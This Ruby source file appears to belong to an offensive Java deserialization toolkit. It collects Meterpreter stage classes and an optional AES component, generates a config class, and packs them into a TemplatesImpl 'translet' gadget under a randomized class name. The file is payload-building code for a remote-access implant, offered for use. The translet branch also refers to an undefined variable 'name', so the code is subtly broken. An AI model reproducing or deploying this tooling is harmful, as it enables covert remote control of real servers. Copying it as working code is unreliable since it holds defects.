require_relative 'classfile'
require_relative 'payloads/templates'

require 'base64'

module Java
  module Meterpreter
    def meterpreter_classes(config, payloadClasses)
      config.keys.each do |key|
        config.delete(key) if config[key].nil? || config[key] == ''
      end

      includes = payloadClasses + [

        'javapayload/stage/Stage.class',
        'metasploit/Payload.class',
        'metasploit/Payload$1.class',
        #		"metasploit/PayloadTrustManager.class",
        'com/metasploit/meterpreter/MemoryBufferURLStreamHandler.class',
        'com/metasploit/meterpreter/MemoryBufferURLConnection.class',
        'javapayload/stage/Meterpreter.class',
        #		"javapayload/stage/Shell.class",
        #		"javapayload/stage/StreamForwarder.class"
      ]

      includes += ['metasploit/AESEncryption.class'] if config.key?('AESPassword')

      # writeEmbeddedFile does not work
      config.delete('Executable')
      config.delete('Spawn')
      config['EmbeddedStage'] = 'Meterpreter'

      classes = [['metasploit/Config.class',
                  Java::Serialize::Classfile.gen_config_class('metasploit/Config', config)]]

      Zip::File.open(::File.dirname(__FILE__) + '/meterpreter-classfile.jar') do |zip_file|
        zip_file.each do |entry|
          next if !entry.file? || !includes.include?(entry.name)
          content = entry.get_input_stream.read
          if entry.name == 'metasploit/TransletPayload.class'
            rand = (0...8).map { (65 + rand(26)).chr }.join
            classes += [['metasploit/' + name, Java::Serialize::Classfile.patch_class(content, 'Translet' + rand, {})]]
          else
            classes += [[entry.name, content]]
          end
        end
      end
      classes
    end
    module_function :meterpreter_classes

    def translet(config)
      classes = meterpreter_classes(config, ['metasploit/TransletPayload.class'])
      tpl = Java::Serialize::Payloads::Templates.make_jdk(classes)
    end
    module_function :translet
  end
end
